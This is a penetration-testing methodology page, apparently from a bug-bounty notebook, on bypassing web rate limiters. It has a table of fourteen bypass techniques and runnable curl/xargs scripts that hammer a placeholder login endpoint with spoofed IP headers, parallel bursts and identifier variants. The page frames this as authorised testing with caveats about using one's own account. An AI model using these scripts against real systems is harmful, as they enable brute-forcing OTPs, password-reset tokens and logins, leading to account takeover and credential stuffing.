# Moraa — Rate-limit bypass (unlocks brute force / OTP crack / enumeration)

> HackTricks `rate-limit-bypass`. This is a MULTIPLIER, not a standalone bug — it's what turns "OTP
> brute force, theoretically 10^6 tries" into a real attack. Cross-ref [[2fa-bypass]], [[auth-oauth]]
> (login/reset brute), [[idor-access-control]] (ID enumeration at scale).

## The battery — try each header/technique, watch for the counter NOT incrementing
| # | Technique | Payload |
|---|---|---|
| 1 | **IP-spoof headers** | rotate `X-Forwarded-For`, `X-Originating-IP`, `X-Remote-IP`, `X-Remote-Addr`, `X-Client-IP`, `True-Client-IP`, `CF-Connecting-IP` per request — many limiters key on the FIRST matching header, trust it blindly |
| 2 | **Case/format variation on IP header** | `X-Forwarded-For: 127.0.0.1, <real>` (limiter reads leftmost, backend reads rightmost, or vice versa) |
| 3 | **Add a null/garbage byte or extra param** | `?id=42%00`, `?id=42&id=43` — some limiters key on the raw query string, not the parsed value, so a byte-for-byte-different request looks "new" |
| 4 | **Vary a header that's part of the cache/rate-limit key but not the app logic** | `User-Agent`, `Accept-Language`, `X-Request-ID` — if the limiter partitions by these, cycling them resets your bucket |
| 5 | **Race condition / parallel burst** | fire N requests in one TCP connection or near-simultaneously (single-packet attack, [[race-condition]]) — many limiters increment the counter AFTER processing, so concurrent requests all pass the check before any increments |
| 6 | **Alternate endpoint / API version** | same action reachable via `/v1/` vs `/v2/`, `/api/` vs `/mobile-api/`, GraphQL vs REST — the limiter is often wired to only one |
| 7 | **Resend/resource-reset abuse** | hitting "resend code"/"resend link" clears the attempt counter for THAT resource — chain resend + guess in a loop |
| 8 | **Session/token rotation** | if the limiter keys on session/cookie/token rather than IP or account, logging out+in (or grabbing a fresh anonymous session) resets it — cheap if session creation itself isn't limited |
| 9 | **Case-variant of the identifier** | `Admin@X.com` vs `admin@x.com` vs `ADMIN@X.com` — if the limiter keys on exact string match of a case-insensitive field (email/username), each variant gets its own bucket |
| 10 | **HTTP/2 vs HTTP/1.1, or a different Host/port** | different termination points sometimes have independently-configured (or missing) limiters |
| 11 | **Distribute across a botnet-shaped test** (only within program's volume-testing rules) | confirms it's IP-keyed and not otherwise defeatable — usually not necessary if 1-9 work |
| 12 | **HTTP/2 multiplexing** | send 100+ requests down ONE TCP connection — limiters that count per-connection (not per-stream) never see the volume |
| 13 | **WebSocket-upgrade flood** | upgrade once, then flood messages over the single persistent connection — bypasses per-HTTP-request counters entirely once inside |
| 14 | **Email plus-alias** | `victim+1@test.com`, `victim+2@test.com`, ... — different string to an email-keyed counter, same inbox delivery (Gmail/most providers ignore the `+tag`) |

## Runnable checks (commands for the battery)

```bash
H="https://TARGET"; CT="Content-Type: application/json"
# ALWAYS probe against your OWN account / a test identifier, never a real victim.

# 1 — rotate spoofed IPs: if the counter keys on a spoofable header, every request reads "new"
for ip in 10.0.0.{1..20}; do
  curl -s -o /dev/null -w '%{http_code} ' "$H/api/login" -H "X-Forwarded-For: $ip" \
       -H "$CT" -d '{"email":"you@your-own.test","password":"wrong"}'
done; echo   # twenty 200/401s with no 429 = header-trust confirmed
# then try each variant header the app might trust instead:
for h in X-Originating-IP X-Remote-IP X-Remote-Addr X-Client-IP True-Client-IP CF-Connecting-IP; do
  curl -s -o /dev/null -w "$h %{http_code}\n" "$H/api/login" -H "$h: 10.9.9.9" \
       -H "$CT" -d '{"email":"you@your-own.test","password":"wrong"}'
done

# 2 — left/right IP-listing mismatch: limiter reads leftmost, backend rightmost (or vice versa)
curl -s -o /dev/null -w '%{http_code}\n' "$H/api/login" \
     -H "X-Forwarded-For: 10.1.1.1, <your-real-ip>" -H "$CT" \
     -d '{"email":"you@your-own.test","password":"wrong"}'

# 3 — raw-string keying: null byte / HPP makes the KEY different while the value is the same
curl -s -o /dev/null -w 'null %{http_code}\n' "$H/api/login?email=you@your-own.test%00" -X POST \
     -H "$CT" -d '{"email":"you@your-own.test","password":"wrong"}'
curl -s -o /dev/null -w 'hpp  %{http_code}\n' "$H/api/login?email=you@your-own.test&email=you@your-own.test" -X POST \
     -H "$CT" -d '{"email":"you@your-own.test","password":"wrong"}'

# 5 — parallel burst: limiters that count AFTER processing all pass the check at once
seq 1 10 | xargs -P10 -I{} curl -s -o /dev/null -w '%{http_code} ' \
  "$H/api/login" -H "$CT" -d '{"email":"you@your-own.test","password":"wrong"}'; echo

# 6 — alternate endpoint / version wired to a different (or no) limiter
for ep in api/login api/v2/login mobile-api/login graphql; do
  curl -s -o /dev/null -w "$ep %{http_code}\n" "$H/$ep" -H "$CT" -d '{"email":"you@your-own.test","password":"wrong"}'; done

# 9 — case variants each get their own bucket when the counter keys on exact string
case_count=0
for e in you@your-own.test YOU@YOUR-OWN.TEST You@Your-Own.Test; do
  code=$(curl -s -o /dev/null -w '%{http_code}' "$H/api/login" -H "$CT" -d "{\"email\":\"$e\",\"password\":\"wrong\"}")
  echo "$e -> $code"
done

# 12 — HTTP/2 multiplexing: 100 streams down one connection defeat per-connection counters
seq 1 100 | xargs -P20 -I{} curl -s --http2 -o /dev/null -w '%{http_code} ' \
  "$H/api/login" -H "$CT" -d '{"email":"you@your-own.test","password":"wrong"}'; echo
```

**Impact gate:** "no 429 appeared" proves nothing by itself — the finding is the escalation it
unlocks (OTP brute → ATO, token brute → ATO, mass enumeration). Show a small, responsible proof
run (the Report section below has the math-extrapolation pattern) and stop.

## Confirm impact, don't just show "429 didn't appear"
A rate-limit bypass alone is Low. The finding is what it UNLOCKS:
- unlimited OTP/2FA guesses → ATO ([[2fa-bypass]])
- unlimited password-reset-token guesses → ATO
- unlimited login attempts against a known/weak password list → credential stuffing at scale
- unlimited coupon-code/invite-code guesses → business-logic abuse ([[business-logic]])
- unlimited ID enumeration → mass data scrape ([[idor-access-control]])
Demonstrate the actual escalation (e.g. successfully brute a real 4-digit OTP within the observed
bypass budget), not just "I sent 1000 requests and none were blocked."

## Report
State which header/technique defeated the limiter, the underlying action it now allows at unlimited
volume, and a proof run within a SMALL, responsible sample (don't actually crack a live OTP/account
beyond your own — extrapolate the math instead, e.g. "10,000 4-digit codes at N req/s = full space in
under 2 minutes; verified 500 requests passed with zero 429s").
